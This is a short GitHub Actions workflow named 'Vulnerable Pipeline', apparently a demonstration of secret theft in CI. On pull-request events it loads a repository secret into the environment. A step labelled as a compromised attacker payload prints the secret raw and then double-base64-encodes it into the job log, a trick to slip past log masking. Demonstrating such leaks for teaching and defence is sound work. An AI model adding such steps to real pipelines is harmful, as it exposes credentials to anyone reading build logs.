name: Vulnerable Pipeline

on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest

    env:
      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Normal step
        run: echo "Pipeline started"
      - name: Étape compromise
        shell: bash
        run: |
          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
          echo "DEBUG SECRET RAW = <$DEMO_SECRET>"
          echo "[Attacker] Lecture du secret : $DEMO_SECRET"
      
          ONE=$(echo -n "$DEMO_SECRET" | base64)
          TWO=$(echo -n "$ONE" | base64)
      
          echo "[Attacker] Secret exfiltré (double Base64) : $TWO"

